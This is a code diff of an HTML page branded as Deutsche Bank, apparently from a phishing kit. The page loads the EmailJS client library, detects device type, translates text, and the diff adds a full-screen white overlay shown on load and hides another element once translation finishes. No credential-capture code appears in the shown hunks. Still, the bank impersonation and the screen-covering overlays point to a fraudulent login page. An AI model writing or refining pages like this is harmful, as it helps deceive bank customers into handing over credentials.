@@ -8,7 +8,8 @@
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" >
 <script type="module">
-    function detectDesktopMode() {
+  document.getElementById("overlay9").style.display ='block'
+  function detectDesktopMode() {
             // Check if the device is a mobile device by user-agent
             const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
 
@@ -147,6 +148,7 @@
   elementsToTranslate.forEach(element => {
             translateText(element.text, targetLanguage, function(translatedText) {
                 document.getElementById(element.id).textContent = translatedText;
+          document.getElementById("nico").style.display ='none'
             });
         });
       const placeholdersToTranslate = [
@@ -852,7 +854,9 @@ font-family: "Poppins", sans-serif;
 
  <div style="display: none"id="kala">
 <div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay"></div>
- <div id="ella1"></div>
+<div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay9"></div>
+
+   <div id="ella1"></div>
  <div style="display: flex; ">
  <div style="font-size: 20px; font-weight: 800; margin-left: 3%; color: #4b2b7f; border: 2px solid #4b2b7f; width: 3%; text-align: center; justify-content: center; align-items: center;  padding: 0px 9px; padding-top: 2px;"><span class="ella">/</span></div>
 <div class="text-bold" style="font-size: 20px; font-weight: 800; margin-left: 2%; color: #4b2b7f;" id="header-472">Deutsche Bank.</div>
